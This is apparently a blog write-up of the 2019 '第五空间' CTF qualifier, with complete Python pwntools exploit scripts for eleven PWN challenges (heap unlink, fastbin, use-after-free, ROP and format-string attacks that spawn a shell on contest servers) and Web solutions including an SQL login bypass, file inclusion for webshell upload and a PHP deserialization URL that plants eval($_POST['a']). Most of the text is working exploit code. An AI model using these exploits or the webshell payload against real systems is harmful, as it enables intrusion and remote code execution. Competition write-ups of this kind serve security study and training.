---
layout: posts
title: Writeup | 第五空间
date: 2019-08-29 14:41:23
tags: writeup

---

“第五空间”网络安全创新能力大赛线上初赛writeup

<!--more-->

# WaterDrop WriteUp

## PWN

### 立雪

这道题比较简单，有一个堆溢出，直接修改下一个chunk的size，做一个unlink attack，然后就有任意写，再写到0x602088，之后就可以直接进后门了

payload如下

```python
from pwn import *

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn15')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('111.33.164.6', 50015)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(sz,content):
    sl('1')
    ru('note:')
    sl(str(sz))
    ru('note:')
    se(content)
    ru('choice:')

def edit(idx,sz,content):
    sl('2')
    ru('Index:')
    sl(str(idx))
    ru('Length of note:')
    sl(str(sz))
    ru('Content of note:')
    se(content)
    ru('choice:')


def delete(idx):
    sl('3')
    ru('Index:')
    sl(str(idx))
    ru('choice:')


add(0x68,'aaa\n')
add(0x68,'aaa\n')
add(0x68,'aaa\n')
add(0xf8,'bbb\n')
add(0x68,'cc\n')
edit(2,0x69,(p64(0)+p64(0x61)+p64(0x6020d0+-0x18)+p64(0x6020d0-0x10)).ljust(0x60,'\0')+p64(0x60)+'\0')
delete(3)
edit(2,0x10,'\0'*8+p64(0x602088))
edit(0,0x8,'aaaa\n')
sl('2019')


p.interactive()
```

### 西来

题目关了fastbin，然后用一个变量限制了malloc的size，但是在delete的时候有一个下标溢出，可以伪造一个chunk在name和desc那里，之后可以控制is_root变量，然后可以malloc的size就变大了，然后直接unlink attack，就有任意地址读写
然后写free_hook为system，直接get shell

payload如下

```python
from pwn import *

debug=0

context.log_level='debug'

if debug:
    #p=process('./pwn12')
    p=process('./pwn12',env={'LD_PRELOAD':'./libc-2.23.so'})
    gdb.attach(p)
else:
    p=remote('111.33.164.6', 50012)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(sz):
    sl('1')
    ru('Size?')
    sl(str(sz))
    ru('5.Exit')

def edit(idx,content):
    sl('2')
    ru('Index?')
    sl(str(idx))
    ru(':')
    se(content)
    ru('5.Exit')

def show(idx):
    sl('3')
    ru("Index?\n")
    sl(str(idx))

def delete(idx):
    sl('4')
    ru("Index?")
    sl(str(idx))
    ru('5.Exit')


ru('what\'s your name?')
se(p64(0)*3+p64(0x31))
ru('what\'s your info?')
se(p64(0x21)*6+cyclic(0x1d0-0x30)+p64(0x6022C1)+p64(0x0000006800000000)+p64(0x6020a0)+p64(0x0000006800000000))
ru('5.Exit')

show(-5)
canary = '\0'+ru('\n')[:-1]
ru('5.Exit')
delete(-4)
add(0x28)
edit(0,p64(0xdeadbeef)[:7])
add(0xf8)
add(0xf8)
add(0xf8)
edit(1,(p64(0)+p64(0xf1)+p64(0x6022f0-0x18)+p64(0x6022f0-0x10)).ljust(0xf0,'\0')+p64(0xf0))
delete(2)
edit(1,p64(0)+p64(0x6022e0)+p32(0x0)+p32(0x100)+p64(0x602080)+p32(0x0)+p32(0x100)+p64(0x6020A8)+p32(0x0)+p32(0x100)+p64(0x6022e0)+p32(0x0)+p32(0x100))
show(2)

libc = u64(ru('\n')[:-1]+'\0\0')-0x68
base = libc-0x3a5610
free_hook = base+0x3a77c8
system = base+0x41490
binsh = base+0x1633e8
ru('5.Exit')

edit(0,p64(0x6022e0)+p32(0x0)+p32(0x100)+p64(free_hook)+p32(0x0)+p32(0x100)+p64(binsh))
edit(1,p64(system))

sl('4')
ru("Index?")
sl('2')

print(hex(base))
p.interactive()
```

### 拈花

栈溢出，直接构造

```
read(0,bss,0x3b)
system("/bin/sh")
```

payload如下

```python
from pwn import *

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn11')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('111.33.164.6', 50011)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

ru('please input your name')
sl('aaa\n')
ru('Let\'s start a game,can you guess the key?')

prdi = 0x4012ab
prsi = 0x4012a9
puts = 0x0401030
bss = 0x404060+0x100
prbp = 0x401149
leave = 0x40124b

context.arch = 'amd64'
payload = 'a'*40 +p64(prdi)+p64(0x0404028)+p64(puts)
payload += flat(0x4012A2,0,1,0x404028,0,bss,0x200,0x0401288,'a'*56)
payload += flat(prbp,bss-8,leave)


se(payload)
ru('fail!\n')
p_addr = u64(ru('\n')[:-1]+'\0\0')
syscall = p_addr+0xe


payload = flat(0x4012A2,0,1,0x404028,0,bss+0x400,0x3b,0x0401288,'a'*56)
payload += flat(0x4012A2,0,1,bss+0x100,bss+0x108,0,0,0x0401288,p64(syscall))
payload = payload.ljust(0x100,'a')
payload += p64(0x04012B8)+'/bin/sh\0'

se(payload)

sleep(0.5)

se(cyclic(0x3b))

print(hex(p_addr))
p.interactive()
```

### 朝彻

这题有一个UAF，可以在chunk被free掉之后还继续改，因此可以直接fastbin attack，然后控制另外一个chunk，就有一个任意读写，但是读只能读2个字节，这个就有点难受，所以做法是首先任意写，改got表中的free，改成main函数，这样每次delete的时候，show和edit的次数又恢复了
之后leak出libc地址，然后把free又改成system，直接get shell

payload如下

```python
from pwn import *

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn10')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('111.33.164.6', 50010)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(content):
    sl('1')
    ru('size :')
    sl(str(len(content)))
    ru('content')
    se(content)
    ru('choice :')

def show(idx):
    sl('2')
    ru('index : \n')
    sl(str(idx))

def edit(idx,content):
    sl('3')
    ru('index :')
    sl(str(idx))
    ru('size :')
    sl(str(len(content)))
    ru('content')
    se(content)
    ru('choice :')

def delete(idx):
    sl('4')
    ru('index :')
    sl(str(idx))
    ru('choice :')

    

add('a'*0x10)
add('b'*0x10)
add('c'*0x10)
add('/bin/sh\0')
edit(0,'a')
delete(0)
sl('3')
ru('Give me your size : ')
sl('1')
ru('content')
se('\x60')
ru('choice :')

add(p64(0x602018))
edit(1,p64(0x400F52)[:7])
delete(3)

sl('3')
ru('Give me your size : ')
sl('8')
ru('content')
se(p64(0x400F52))
ru('choice :')

edit(0,p64(0x602020))
show(1)
data = ru('\n')[:-1]
ru('choice :')

sl('3')
ru('Give me your size : ')
sl('8')
ru('content')
se(p64(0x602022))
ru('choice :')

delete(3)

show(1)
data = data+(ru('\n')[:-1])
ru('choice :')


edit(0,p64(0x602024))
delete(3)
show(1)
data = data+(ru('\n')[:-1])
ru('choice :')

puts = u64(data+'\0\0')
base = puts - 0x6b990
free_hook = base+0x3a77c8
system = base +0x41490

delete(3)

sl('3')
ru('Give me your size : ')
sl('8')
ru('content')
se(p64(0x602018))
ru('choice :')

edit(1,p64(system))

sl('4')
ru('index')
sl('3')

print(hex(puts))


p.interactive()

```

### 坐忘

简单leak canary，然后base64解码一下，直接栈溢出

```python
from pwn import *
import base64

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn9')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('111.33.164.6', 50009)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)


ru('>')
sl(base64.b64encode('a'*9))
ru('a'*9)
canary = u64('\0'+ru('\n')[:7])
ru('continue ?')
sl('yes')

r=ROP('./pwn9')
prdi = r.rdi[0]
prsi = r.rsi[0]
prdx = r.rdx[0]
bss = 0x6CCBA0
read = 0x43FF70
syscall = 0x43FF9F

context.arch = 'amd64'
payload = '\0'*8+p64(canary)
payload += 'a'*8
payload += flat(prdi,0,prsi,bss,prdx,0x3b,read,prdi,bss,prsi,0,prdx,0,syscall)

ru('>')
sl(base64.b64encode(payload))
ru('continue ?')
sl('no')
sleep(0.5)
se('/bin/sh\0'.ljust(0x3b,'\0'))

p.interactive()
```

### 玄冥

off by null -> unlink -> write anywhere 

```python
from pwn import *

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('111.33.164.6', 50007)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(sz):
    sl('1')
    ru('size:')
    sl(str(sz))
    ru('>>')

def show(idx):
    sl('2')
    ru('id:')
    sl(str(idx))
    ru('data:')

def edit(idx,sz,content):
    sl('3')
    ru('id:')
    sl(str(idx))
    ru('size:')
    sl(str(sz))
    ru('content:')
    se(content)
    ru('>>')

def delete(idx):
    sl('4')
    ru('id:')
    sl(str(idx))
    ru('>>')

add(0xf8)
add(0xf8)
add(0xf8)
delete(0)
add(0xf8)
show(0)
libc = u64(ru('\n')[:-1]+'\0\0')
base = libc-0x3a5678
free_hook = base+0x3a77c8
system = base+0x41490
binsh = base+0x1633e8
ru('>>')

edit(0,0x100,(p64(0)+p64(0xf1)+p64(0x6020E0-0x18)+p64(0x6020E0-0x10)).ljust(0xf0,'\x00')+p64(0xf0)+p64(0x100)[:7])

delete(1)
edit(0,0x31,p64(0)*3+p64(0x6020E0)+p64(free_hook)+p64(binsh))
edit(1,9,p64(system))


sl('4')
ru('id:')
sl('2')

print(hex(libc))
p.interactive()
```

### 於讴

简单栈溢出，和拈花一样

```python
from pwn import *

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('111.33.164.6', 50006)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

r=ROP('./pwn')
e=ELF('./pwn')
prdi = r.rdi[0]
prsi = r.rsi[0]
puts = e.plt['puts']
bss = 0x620000+0x800
prbp = r.rbp[0]
leave = r.leave[0]

context.arch = 'amd64'

sl('1000')
ru('OH, WHY ARE YOU SO GOOD?\n')
payload = 'a'*24 +p64(prdi)+p64(0x620030)+p64(puts)
payload += flat(0x414FBA,0,1,0x620030,0x200,bss,0,0x414FA0,'a'*56)
payload += flat(prbp,bss-8,leave)


se(payload+'\n')
p_addr = u64(ru('\n')[:-1]+'\0\0')
syscall = p_addr+0xe


payload = flat(0x414FBA,0,1,0x620030,0x3b,bss+0x400,0,0x414FA0,'a'*56)
payload += flat(0x414FBA,0,1,bss+0x100,0,0,bss+0x108,0x414FA0,p64(syscall))
payload = payload.ljust(0x100,'a')
payload += p64(0x0414FD8)+'/bin/sh\0'

raw_input()

se(payload)

raw_input()
se(cyclic(0x3b))

print(hex(p_addr))
p.interactive()

```

### 聂许

抄的是上一年xnuca的secretcenter

这里可以设置任意的seccomp规则，然后有一个格式化字符串漏洞，但是是使用fprintf_chk，可以设置seccomp规则来绕过%n的check，然后利用格式化字符串直接写got表，在open那里写一个one_gadget，直接get shell

```python
from pwn import *

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn')
    #p=process(['seccomp-tools','dump','./pwn'])
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('111.33.164.6', 50004)

def ru(x):
    return p.recvuntil(x,timeout=3)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(content,n=False):
    sl('1')
    ru('input the size')
    sl('240')
    ru('input your content: ')
    se(content)
    if n:
        sleep(0.5)
        se('000000000000-ffffffffffff r-xp 00000000 00:00 0 /bin/Ch4r1l3\n')        
    return ru('Your choice :')

ru('Your choice :')
sl('3')
ru('Your choice :')
sl('666')
ru('input yout choice: ')
sl('1') 
ru('input the size')

if debug:
    rule = ' \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\b>\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x06\x00\x03\x00\x00\x00\x15\x00\x05\x00\xE7\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00\x10\x00\x00\x00T\x00\x00\x00\xFF\x00\x00\x00\x15\x00\x01\x00|\x00\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00'

else:
    rule = ' \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\b>\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x06\x00\x03\x00\x00\x00\x15\x00\x05\x00\xE7\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00\x10\x00\x00\x00T\x00\x00\x00\xFF\x00\x00\x00\x15\x00\x01\x00[\x00\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00'

sl(str(len(rule)))
ru('input your content')
se(rule)

ru('Your choice :')
sl('4')
ru('Your choice :')

add(('%41c'+'%c'*7+'%n%n').ljust(0x18,'a')+p64(0x6020F0)+p64(0x6020F4),True)
data = add(('%249c'+'%c'*7+'%hhn').ljust(0x18,'a')+p64(0x6020f4),True)
wd = data.index('[heap]\n')+7
base = int(data[wd:wd+12],16)
add(('%41c'+'%c'*7+'%n%n').ljust(0x18,'a')+p64(0x6020F0)+p64(0x6020F4),True)


prctl = 0x602078
ooo = 0x602090

if debug:
    system = base + 0x45390
    free_hook = base + 0x3c67a8
else:
    system = base + 0x41490
    free_hook = base + 0x3a77c8

if debug:
    data = p64(base+0xf02a4)
else:
    data = p64(base+0x41374)
for i in range(6):
    add(('%'+str(ord(data[i])-7)+'c'+'%c'*7+'%hhn').ljust(0x18,'a')+p64(ooo+i),True)

add(('%249c'+'%c'*7+'%hhn').ljust(0x18,'a')+p64(0x6020f4),True)

print(hex(base))
print(hex(system))
p.interactive()

```



### 副墨

这个题感觉自己有点非预期。太久没做栈溢出有点蠢。首先发现srand的seed是可以溢出改掉的，这意味着后面的rand猜10个数毫无意义。接下来就是官方后门：给了一个格式化字符串和栈溢出。用格式化字符串泄露canary和程序基址，之后就找一个binsh的地址给rdi去调用官方后门pwn的system就好了。一个比较正确的做法应该是用csu来打ROP（队里另一个师傅说的），但我写的时候强行leak了libc的地址，然后用libc里的binsh来给rdi去调用system（为什么我不直接one gadget呢？）。而且leak libc还贼麻烦，对着服务器试了好久才找到对应版本的libc。

```python
from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'

lt = [0x173db,0x12fc9,0x23bc,0xabb7,0xdfbf,0x11294,0xc09c,0xff2a,0x9101,0x5b55]

debug = 0
if debug:
	p = process('./bf.bak')
	gdb.attach(p)
else:
	p = remote('111.33.164.4',50001)

def se(x):
	p.send(x)

def sl(x):
	p.sendline(x)

def ru(x):
	p.recvuntil(x)

ru('game?\n')
raw_input()
sl('1')
ru(':')
#payload = "%17$p%11$p%p"
payload = "%17$p%23$p%p"
se(payload.ljust(0x20,'a'))
#sl(payload)
for i in range(10):
	ru(':')
	sl(str(lt[i]))
ru('0x')
canary = int(p.recv(16),base = 16)
print(hex(canary))
ru('0x')
base = int(p.recv(12), base = 16)
#base = base -0xd50
base = base - 0xabf
backdoor = base + 0xab3
rdi_p = base + 0x0000000000000db3
rsi_r15_p = base + 0x0000000000000db1
bss = base + 0x202089
puts = base + 0xbae
ru('0x')
#libc = int(p.recv(12), base = 16)-0x3c56a3
libc = int(p.recv(12), base = 16) - 0x83 - 0x3a62a0
system = libc+0x1633e8
print(hex(base))
print(hex(puts))
print(hex(libc))
payload = 'a'*0x30+'\x00'*4+p64(canary)+'/bin/sh\x00'+p64(rdi_p)+p64(system)+p64(backdoor)
#payload = 'a'*0x30+'\x00'*4+p64(canary)+'/bin/sh\x00'+p64(backdoor)
sl(payload)
p.interactive()

```

### 洛诵

这题给的libc是2.27，但是实际还是2.19的libc，因此直接leak libc+heap的地址，然后unlink一波，之后fastbin attack即可

```python
from pwn import *

debug=0
context.log_level='debug'


if debug:
    p=process('./mybooks',env={'LD_PRELOAD':'./libc.so.6'})
    gdb.attach(p)
else:
    p=remote('111.33.164.6', 50002)

def ru(x):
    return p.recvuntil(x)
    
def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(name,sz,desc):
    sl('1')
    ru('Enter book name (Max 24 chars):')
    se(name)
    ru('Enter desc size:')
    sl(str(sz))
    ru('Enter book description: ')
    se(desc)
    ru('>')

def edit(idx,name,desc):
    sl('3')
    ru('Enter the book id you want to edit: ')
    sl(str(idx))
    ru('name: ')
    se(name)
    ru('Enter new book description: ')
    se(desc)
    ru('>')

def delete(idx):
    sl('2')
    ru('delete: ')
    sl(str(idx))
    ru('> ')

def show(idx):
    sl('4')
    ru('show: ')
    sl(str(idx))

ru('Pls input pass:')
sl('\x08\x08\x08\x08\x08\x08\x08\x08\xa4ABB\x08\x08\x08\x08\x08\x08')
ru('> ')

add('a'*0x18,0x4f8,'aaa') #0
add('b'*0x18,0xf8,'bbb') #1
add('c',0x18,'d') #2
delete(0)
add('a'*0x10+'\0',0x4f8,'c')
show(0)
ru('Description: ')
libc = u64(ru('\n')[:-1]+'\0\0')-0x63+0x10
base = libc - 0x3a5610
ru('>')

delete(0)
add('c'*0x18,0x600,'ccc') #0
delete(2)
add('c'*0x18,0x4f8,'a'*0x10) #2
show(2)
ru('a'*0x10)
heap = u64(ru('\n')[:-1]+'\0\0')-0x50
ru('>')

delete(0)
delete(1)
delete(2)

add('a',0x408+0x290,'aaa')
for i in range(10):
    add('a',0x18,'c')

for i in range(10):
    delete(i+1)

add('a',0xf8,'a') #1
add('b',0xf8,'b') #2
add('c',0xf8,'c') #3
fake = 'a'*136 + p64(0x71)+p64(heap+0xbf0)*2+p64(heap+0xbe0)*2
fake = fake.ljust(0xf0,'\0')
fake += p64(0x70)
edit(1,'a\n',fake)
delete(2)

add('d',0x68,'d') #2
add('e',0xf8,'e') #4

delete(1)
delete(2)

malloc_hook = base+0x3a5610

fake = 'a'*136 + p64(0x71)+p64(malloc_hook-0x23)
add('f', 0xf8,fake) #1
add('g', 0x68,'a') #2
add('h',0x68,'a'*11+p64(base+0xd6e77)+p64(base+0x7C6A0 ))
sl('1')

print(hex(base))
print(hex(heap))
p.interactive()

```



### 正定

pwn14有个官方后门，只要bss段处某个值（0x4040A0处）大于0x7e3就可以了。题目有很明显的堆溢出。堆溢出修改fastbin中后面一个chunk的fd字段给bss，注意size位的校验（往上几个位置把7f当成size就行），然后直接往里面写ffffffff，操作完之后在选单输入70就会ok然后getshell了。（payload妹操作70，需要自己打一下）

```python
from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'

debug = 0
if debug:
	p = process('./pwn14')
	gdb.attach(p, 'b* 0x4015F3')
else:
	p = remote('111.33.164.6',50014)

def se(x):
	p.send(x)

def sl(x):
	p.sendline(x)

def ru(x):
	p.recvuntil(x)

def new(sz, content):
	ru('Your choice : ')
	sl('1')
	ru('Size of note : ')
	sl(str(sz))
	ru('Content of note:')
	se(content)

def edit(idx, sz, content):
	ru('Your choice : ')
	sl('2')
	ru('Index :')
	sl(str(idx))
	ru('Size of note : ')
	sl(str(sz))
	ru('Content of note : ')
	se(content)

def delete(idx):
	ru('Your choice : ')
	sl('3')
	ru('Index :')
	sl(str(idx))

new(0x60, 'a'*0x60)
new(0x60, 'b'*0x60)
new(0x60, 'c'*0x60)
new(0x60, 'd'*0x60)

delete(1)
delete(2)

bss = 0x4040a0

payload = 'a'*(0x60*2+0x10) + p64(0) + p64(0x71) + p64(bss-0x13)
edit(0, len(payload), payload)

new(0x60, 'e'*0x60)
new(0x60, '\xff'*0x60)

#gdb.attach(p)

p.interactive()

```



### 一苇

有官方后门，栈溢出。调用两次。第一次leak出程序基址~~（话说仔细想想好像也不用leak）~~ ，第二次覆写rip的低三位到官方后门即可。

```python
from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'

debug = 0
if debug:
	p = process('./pwn13')
	gdb.attach(p)
else:
	p = remote('111.33.164.6',50013)

def se(x):
	p.send(x)

def sl(x):
	p.sendline(x)

def ru(x):
	p.recvuntil(x)

ru(':')
payload = 'aaaaaaaa'
sl('1')
ru('input massage\n')
se(payload+'\n')
ru('your message:')
p.recvuntil(payload)
x = u64((p.recv(6)).ljust(8,'\x00'))
print(hex(x))
base = x - 0xa0a
backdoor = base + 0xa50
print(hex(backdoor))

ru('your choice:')
sl('1')
ru('input massage\n')
payload = 'a'*0x28+p64(backdoor)[0:2]
print(len(payload))
se(payload)
#raw_input()
p.interactive()

```

## Web

### 空相

{% asset_img 1.png%}

尝试万能密码

{% asset_img 2.png%}

{% asset_img 3.png%}

### 空性

前端得到地址

{% asset_img 4.png%}

{% asset_img 5.png%}

猜测为vim 缓存文件，访问 .xxx.php.swp，得到源码

{% asset_img 6.png%}

file_get_contents 当文件不存在时返回空

extract 可替换掉 $a，所以构造 payload

/?fname=1&a=

{% asset_img 7.png%}

点击进入，看到文件上传

{% asset_img 8.png%}

上传只支持jpg、png、gif、zip、mp3、csv等文件格式

猜测存在 zip 协议的文件包含，需要寻找包含点，查看刚刚url

http://111.33.164.6:10003/2d019a311aaa30427.php?refer=df53ca268240ca76670c8566ee54568a&t=20190828&dtype=computer&file=3792689baaabc7eb&hash256=66a4640314ba953927b210a33e8f9393

存在参数
file，将其值替换为 php://filter/read=convert.base64-encode/resource=3792689baaabc7eb

{% asset_img 9.png%}

文件包含！

访问3792689baaabc7eb.php发现不存在，3792689baaabc7eb.html 存在，得知后缀加了 .html，所以构造 .html 的 zip 

{% asset_img 10.png%}

上传后，蚁剑连接

{% asset_img 11.png%}

得到 flag

{% asset_img 12.png%}

### 八苦

扫目录，查看源码index.phps

{% asset_img 13.png%}

反序列化，step1 提示，查看 phpinfo()，直接构造序列化串

{% asset_img 14.png%}

{% asset_img 15.png%}

找到 preload 文件

{% asset_img 16.png%}

构造 反序列化串

{% asset_img 17.png%}

O%3A13%3A"Welcome_again"%3A2%3A%7Bs%3A7%3A"willing"%3Bi%3A1%3Bs%3A6%3A"action"%3BO%3A4%3A"Test"%3A2%3A%7Bs%3A10%3A"%00%2A%00careful"%3BN%3Bs%3A8%3A"securuty"%3Ba%3A1%3A%7Bs%3A9%3A"say_hello"%3Bi%3A1%3B%7D%7D%7D

http://111.33.164.6:10004/?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3BN%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D&dangerous="/var/www/html/flag.php";eval($_POST['a'])

蚁剑连接

{% asset_img 18.png%}

得到flag

### 六尘

扫描目录扫到/log目录，访问 access.log

{% asset_img 19.png%}

查找 flag，得到 flag 提交地址

{% asset_img 20.png%}

得到 flag

{% asset_img 21.png%}